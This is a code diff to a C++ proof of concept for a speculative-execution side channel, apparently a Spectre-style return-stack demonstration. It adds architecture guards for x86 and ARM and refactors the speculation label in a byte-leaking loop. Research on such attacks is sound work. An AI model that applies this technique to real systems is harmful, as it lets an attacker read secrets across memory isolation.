@@ -41,7 +41,14 @@ const std::array<BigByte, 256> *oracle_ptr;
 // executing the code that follows.
 __attribute__((noinline))
 static void speculation() {
+#if defined(__i386__) || defined(__x86_64__) || defined(_M_X64) || \
+    defined(_M_IX86)
   UnwindStackAndSlowlyReturnTo(afterspeculation); // Never returns back here.
+#elif defined(__aarch64__)
+  UnwindStackAndSlowlyReturn();
+#else
+#  error Unsupported architecture.
+#endif
 
   // Everything that follows this is architecturally dead code. Never reached.
   // Only the first two statements are executed speculatively.
@@ -67,24 +74,22 @@ static char leak_byte() {
   for (volatile int run = 0;; ++run) {
     sidechannel.FlushOracle();
 
-    // On ARM we have to manually backup registers that are callee saved,
-    // because the "speculation" method would never restore their backups.
-    #ifdef __aarch64__
+#ifdef __aarch64__
+    // On ARM we have to manually backup registers that are callee-saved,
+    // because the "speculation" method will never restore their backups.
     BackupCalleeSavedRegsAndReturnAddress();
-    #endif
+#endif
 
     // Yields two "call" instructions, one "ret" instruction, speculatively
-    // accesses the oracle and ends up on the label below.
+    // accesses the oracle and ends up on the afterspeculate label.
     speculation();
 
-    // Terminating label.
-    asm volatile(
-        "_afterspeculation:\n" // For MacOS.
-        "afterspeculation:\n"); // For Linux.
+    // Inlines the afterspeculation label.
+    afterspeculate();
 
-    #ifdef __aarch64__
+#ifdef __aarch64__
     RestoreCalleeSavedRegs();
-    #endif
+#endif
 
     volatile std::pair<bool, char> result =
         sidechannel.AddHitAndRecomputeScores();
